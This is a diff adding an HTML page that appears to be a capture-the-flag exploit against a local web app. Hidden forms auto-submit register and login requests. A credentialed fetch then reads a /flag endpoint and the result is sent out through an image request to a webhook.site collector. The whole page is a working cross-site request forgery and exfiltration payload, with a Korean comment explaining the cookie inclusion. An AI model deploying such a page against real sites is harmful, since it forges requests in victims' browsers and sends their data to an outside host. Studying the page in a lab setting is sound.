@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html>
+<body>
+<iframe name="f1" id="f1"></iframe>
+
+<form id="regForm" method="POST" action="http://localhost:3000/register" target="f1">
+  <input name="username" value="fetchuser">
+  <input name="password" value="fetchuser">
+</form>
+
+<form id="loginForm" method="POST" action="http://localhost:3000/login" target="f1">
+  <input name="username" value="fetchuser">
+  <input name="password" value="fetchuser">
+</form>
+
+<script>
+document.getElementById('regForm').submit();
+
+setTimeout(function(){
+  document.getElementById('loginForm').submit();
+}, 150);
+
+// fetch로 /flag 요청 (credentials: include로 쿠키 포함)
+setTimeout(function(){
+  fetch('http://localhost:3000/flag', {credentials: 'include'})
+    .then(r => r.text())
+    .then(t => new Image().src = 'https://webhook.site/showontest?flag=' + encodeURIComponent(t))
+    .catch(e => new Image().src = 'https://webhook.site/showontest?err=' + encodeURIComponent(e.message));
+}, 500);
+</script>
+</body>
+</html>
